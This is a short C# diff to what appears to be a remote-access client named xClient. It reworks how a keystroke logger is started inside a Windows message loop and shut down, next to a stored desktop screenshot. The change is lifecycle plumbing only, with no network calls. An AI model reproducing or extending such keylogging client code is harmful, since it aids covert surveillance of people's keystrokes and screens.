@@ -17,6 +17,7 @@ namespace xClient
         private static bool _reconnect = true;
         private static volatile bool _connected = false;
         private static Mutex _appMutex;
+        private static ApplicationContext _msgLoop;
 
         [STAThread]
         private static void Main(string[] args)
@@ -38,7 +39,9 @@ namespace xClient
             if (CommandHandler.LastDesktopScreenshot != null)
                 CommandHandler.LastDesktopScreenshot.Dispose();
             if (Logger.Instance != null)
-                Logger.Instance.Enabled = false;
+                Logger.Instance.Dispose();
+            if (_msgLoop != null)
+                _msgLoop.ExitThread();
             if (_appMutex != null)
                 _appMutex.Close();
 
@@ -136,8 +139,10 @@ namespace xClient
                 {
                     new Thread(() =>
                     {
-                        Logger logger = new Logger(15000) { Enabled = true };
-                    }).Start();
+                        _msgLoop = new ApplicationContext();
+                        Logger logger = new Logger(15000);
+                        Application.Run(_msgLoop);
+                    }).Start(); ;
                 }
             }
             else
